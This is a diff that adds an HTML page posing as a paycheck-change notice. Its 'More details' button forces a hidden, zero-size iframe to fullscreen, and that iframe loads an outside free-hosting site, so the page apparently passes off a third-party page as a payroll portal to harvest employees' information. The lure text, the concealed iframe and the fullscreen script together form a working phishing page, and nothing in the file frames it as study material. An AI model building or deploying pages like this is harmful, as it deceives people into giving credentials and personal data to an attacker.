@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+</head>
+<body>
+
+<h2>Changes in your paycheck</h2>
+
+<p>Your payrol information has been changed.</p>
+
+<button onclick="openFullscreen();">More details</button>
+
+
+
+<iframe src="https://enarched-wills.000webhostapp.com" height="0" width="0"controls id="myvideo"></iframe>
+
+<script>
+/* Get the element you want displayed in fullscreen */ 
+var elem = document.getElementById("myvideo");
+
+/* Function to open fullscreen mode */
+function openFullscreen() {
+  if (elem.requestFullscreen) {
+    elem.requestFullscreen();
+  } else if (elem.webkitRequestFullscreen) { /* Safari */
+    elem.webkitRequestFullscreen();
+  } else if (elem.msRequestFullscreen) { /* IE11 */
+    elem.msRequestFullscreen();
+  }
+}
+</script>
+
+
+</body>
+</html>
